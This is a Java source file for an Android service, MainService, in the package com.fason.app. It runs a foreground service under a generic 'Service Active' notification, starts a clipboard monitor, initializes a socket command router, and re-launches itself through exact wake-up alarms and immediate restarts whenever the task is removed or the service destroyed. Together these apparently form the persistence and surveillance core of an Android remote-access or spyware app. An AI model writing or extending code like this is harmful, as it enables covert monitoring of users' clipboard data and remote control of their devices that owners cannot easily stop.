package com.fason.app.service;

import android.app.AlarmManager;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.SystemClock;
import android.content.pm.ServiceInfo;

import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import com.fason.app.R;
import com.fason.app.core.network.SocketCommandRouter;
import com.fason.app.features.clipboard.ClipboardMonitor;
import com.fason.app.receiver.BootReceiver;

public class MainService extends Service {

    private static final String CHANNEL = "MainService";
    private ClipboardMonitor clipMonitor;

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(1, new NotificationCompat.Builder(this, CHANNEL)
                .setContentTitle("Service Active")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setOngoing(true).build(), ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(1, new NotificationCompat.Builder(this, CHANNEL)
                .setContentTitle("Service Active")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setOngoing(true).build());
        }

        clipMonitor = ClipboardMonitor.getInstance(this);
        clipMonitor.start();
        SocketCommandRouter.initialize();
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL, "Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        scheduleRestart();
    }

    @Override
    public void onDestroy() {
        if (clipMonitor != null) clipMonitor.stop();
        scheduleRestart();
        super.onDestroy();
    }

    private void scheduleRestart() {
        try {
            Intent i = new Intent(this, BootReceiver.class);
            i.setAction("respawnService");

            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) flags |= PendingIntent.FLAG_IMMUTABLE;

            PendingIntent pi = PendingIntent.getBroadcast(this, 0, i, flags);
            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            
            if (am != null) {
                long trigger = SystemClock.elapsedRealtime() + 2000;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                } else {
                    am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                }
            }

            ContextCompat.startForegroundService(this, new Intent(this, MainService.class));
        } catch (Exception ignored) {}
    }
}
